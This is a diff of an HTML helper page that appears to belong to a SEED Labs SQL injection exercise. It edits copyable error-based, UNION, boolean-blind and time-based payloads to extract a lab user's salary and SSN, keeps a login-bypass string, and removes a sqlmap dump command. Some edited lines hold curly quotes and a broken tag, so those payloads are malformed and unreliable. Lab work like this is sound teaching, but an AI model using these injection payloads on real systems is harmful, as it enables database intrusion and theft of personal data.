@@ -26,20 +26,21 @@
     <button onclick="copyToClipboard('vuln-code')">Copy Vulnerable Code</button>
 
     <h2>2. Malicious Payloads for In-band SQLi</h2>
-    <pre id="inband-error">nonexistent' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) = 1 -- </pre>
+    <pre id="inband-error">nonexistent’ AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT Salary FROM credential WHERE name=‘Alice’), 0x7e)) = 1 -- </pre>
     <button onclick="copyToClipboard('inband-error')">Copy Error-based Payload</button>
 
-    <pre id="inband-union">nonexistent' AND 1=0 UNION SELECT @@version COLLATE latin1_swedish_ci,2,3,4,5,6,7,8,9,10 -- </pre>
+    <pre id="inband-union">nonexistent’ AND 1=0 UNION SELECT 1,(SELECT Salary FROM credential WHERE name=‘Alice’),3,4,5,6,7,8,9,10,11 –- </pre>
     <button onclick="copyToClipboard('inband-union')">Copy Union-based Payload</button>
 
     <pre id="inband-bypass">admin' # </pre>
     <button onclick="copyToClipboard('inband-bypass')">Copy Login Bypass Payload</button>
 
     <h2>3. Malicious Payloads for Blind SQLi</h2>
-    <pre id="blind-boolean">admin' AND SUBSTRING((SELECT Password FROM credential WHERE name='admin'),1,1)='a' -- </pre>
+    <pre>Alice's SSN: 10211002</pre>
+    <pre id="blind-boolean"admin' AND SUBSTRING((SELECT ssn FROM credential WHERE name=‘Alice'),1,1)=‘1' --  </pre>
     <button onclick="copyToClipboard('blind-boolean')">Copy Boolean-based Payload</button>
 
-    <pre id="blind-time">admin' AND IF(1=1, SLEEP(5), 0)=0 -- </pre>
+    <pre id="blind-time">admin' AND IF(SUBSTRING((SELECT ssn FROM credential WHERE name='Alice'),1,1)='1', SLEEP(3), 0)=0 -- </pre>
     <button onclick="copyToClipboard('blind-time')">Copy Time-based Payload</button>
 
     <h2>4. UPDATE Injection Payloads (Edit Profile Nickname)</h2>
@@ -72,10 +73,6 @@ $stmt = $mysqli->prepare("CALL LoginUser(?, ?)");
 $stmt->bind_param("ss", $input_uname, $hashed_pwd);
 $stmt->execute();</pre>
     <button onclick="copyToClipboard('stored-proc-php')">Copy Stored Procedure PHP Call</button>
-
-    <h2>7. sqlmap Command for Testing</h2>
-    <pre id="sqlmap">sqlmap -u "http://www.SEEDLabSQLInjection.com/index.php" --data="username=admin&Password=123" --dump</pre>
-    <button onclick="copyToClipboard('sqlmap')">Copy sqlmap Command</button>
 
 </body>
 </html>
